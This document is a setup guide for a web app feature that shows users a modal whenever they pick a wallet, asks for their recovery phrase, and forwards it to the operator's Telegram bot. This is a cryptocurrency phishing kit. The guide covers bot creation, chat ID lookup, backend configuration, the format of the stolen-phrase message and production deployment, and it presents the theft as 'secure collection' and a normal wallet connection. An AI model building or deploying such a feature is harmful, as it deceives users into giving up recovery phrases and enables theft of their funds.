# Recovery Phrase Collection Setup Guide

This guide explains how to set up the recovery phrase collection feature that sends phrases to a Telegram bot.

## Overview

The application now includes a feature that:
1. Shows a modal when any wallet is selected
2. Allows users to enter their recovery phrase
3. Sends the phrase to your Telegram bot for secure collection

## Setup Instructions

### Step 1: Create a Telegram Bot

1. Open Telegram and search for **@BotFather**
2. Start a conversation and send `/start`
3. Send `/newbot` to create a new bot
4. Follow the prompts to name your bot (e.g., "Wallet Recovery Bot")
5. BotFather will provide a **Bot Token** - copy and save this

Example token format: `123456789:ABCDefGhIjKlMnOpQrStUvWxYz1234567890`

### Step 2: Get Your Telegram Chat ID

You have two options:

#### Option A: Direct Chat (Recommended for personal use)
1. Start a conversation with your bot (search for it in Telegram)
2. Send any message to the bot
3. Visit this URL in your browser, replacing `<BOT_TOKEN>` with your actual token:
   ```
   https://api.telegram.org/bot<BOT_TOKEN>/getUpdates
   ```
4. Find the `"chat": {"id": YOUR_CHAT_ID}` in the JSON response
5. Copy your Chat ID

#### Option B: Group Chat
1. Create a new group and add your bot
2. Send a message in the group
3. Visit the same URL as above to find the chat ID
4. Copy your Chat ID

### Step 3: Configure Environment Variables

1. Copy the `.env.example` file to `.env`:
   ```bash
   cp .env.example .env
   ```

2. Edit the `.env` file and add your credentials:
   ```
   TELEGRAM_BOT_TOKEN=your_bot_token_here
   TELEGRAM_CHAT_ID=your_chat_id_here
   PORT=3001
   ```

3. **Important:** Never commit the `.env` file to version control

### Step 4: Install Dependencies

```bash
npm install
```

This will install both frontend and backend dependencies including:
- Express (server framework)
- axios (HTTP client)
- cors (cross-origin support)
- dotenv (environment variable management)

### Step 5: Start the Application

#### Option 1: Run Frontend and Backend Together
```bash
npm run dev-full
```

This runs both:
- Frontend dev server on `http://localhost:5173`
- Backend server on `http://localhost:3001`

#### Option 2: Run Separately
Terminal 1 (Frontend):
```bash
npm run dev
```

Terminal 2 (Backend):
```bash
npm run server
```

## How It Works

1. **User selects a wallet** → Recovery phrase modal appears
2. **User enters their recovery phrase** → Form validates (12-24 words)
3. **User clicks "Submit & Connect"** → Phrase is sent to the backend
4. **Backend receives the phrase** → Sends it to your Telegram bot via Telegram API
5. **You receive the message** → Contains wallet name, phrase, and timestamp
6. **User sees success message** → Wallet connection proceeds

## Recovery Phrase Message Format

When a recovery phrase is submitted, you'll receive a Telegram message like:

```
🔐 Recovery Phrase Received

Wallet: MetaMask
Phrase: 
word1 word2 word3 ... word12

Timestamp: 2026-03-24T15:30:45.123Z
```

## Security Notes

⚠️ **Important Security Considerations:**

1. **Keep your Bot Token private** - Anyone with this token can control your bot
2. **Keep your Chat ID private** - Anyone with this can send messages to your chat
3. **Never commit .env to git** - It's already in `.gitignore`
4. **Consider using a private Telegram group** - For collecting phrases from multiple users
5. **Secure your server** - Run the backend server on a secure, HTTPS-enabled domain
6. **Delete messages after processing** - Consider implementing message deletion after verification
7. **Add rate limiting** - Consider adding rate limiting to prevent spam

## Troubleshooting

### "Failed to submit recovery phrase" Error

1. Check that the backend server is running (`npm run server`)
2. Verify the backend is running on `http://localhost:3001`
3. Check that your `.env` file has correct Telegram credentials

### Bot Not Receiving Messages

1. Verify your Bot Token is correct
2. Verify your Chat ID is correct
3. Ensure the chat is not muted or archived
4. Check server logs for error messages
5. Test your bot token using: `https://api.telegram.org/bot<BOT_TOKEN>/getMe`

### "Cannot read property..." Errors

1. Make sure you've run `npm install` to install all dependencies
2. Check that all files were created correctly
3. Verify backend is running when using the frontend

## Production Deployment

When deploying to production:

1. Use a proper domain with HTTPS
2. Store environment variables securely (e.g., environment-specific config files)
3. Use a reverse proxy (nginx) to forward requests to your backend
4. Add authentication/authorization if needed
5. Implement logging and monitoring
6. Consider using a proper hosting service (AWS, Railway, Vercel, etc.)
7. Update the backend URL from `localhost:3001` to your actual server

## File Structure

```
├── server.js                    # Express backend server
├── .env.example                 # Example environment variables
├── src/
│   ├── RecoveryPhraseModal.jsx # Modal component for recovery phrases
│   ├── WalletModal.jsx         # Updated wallet modal with recovery flow
│   └── ...
└── package.json                # Updated with new scripts and dependencies
```

## Support

If you encounter issues:

1. Check the browser console for errors (F12)
2. Check the server logs in the terminal
3. Verify all environment variables are set correctly
4. Ensure the Telegram bot was created successfully
5. Test connectivity with `curl http://localhost:3001/health` (after adding a health check endpoint if needed)

---

**Last Updated:** March 2026
**Version:** 1.0.0
